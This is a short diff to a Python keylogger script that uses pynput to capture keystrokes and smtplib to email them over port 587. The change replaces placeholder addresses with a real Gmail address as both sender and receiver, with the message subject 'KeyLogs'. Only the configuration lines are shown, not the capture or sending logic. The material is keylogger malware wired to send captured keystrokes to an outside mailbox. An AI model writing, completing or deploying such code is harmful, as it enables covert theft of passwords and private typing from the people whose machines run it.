@@ -1,12 +1,12 @@
 from pynput import keyboard
 import smtplib,ssl
-sender_mail = "user@domain.com"     # Replace user@domain.com with your email id (everywhere)
+sender_mail = "siddiquiansah@gmail.com "  
 #prefer using your own email id for receiver's as well.
-receiver_mail = "user@domain.com"  # Replace user@domain.com with your email id (everywhere)
+receiver_mail = "siddiquiansah@gmail.com"  #  user@domain.com
 password = "passcode"              # Enter your Password here
 port = 587
-message = """From: user@domain.com
-To: user@domain.com                         
+message = """From: siddiquiansah@gmail.com  
+To: siddiquiansah@gmail.com                           
 Subject: KeyLogs
 Text: Keylogs 
 """
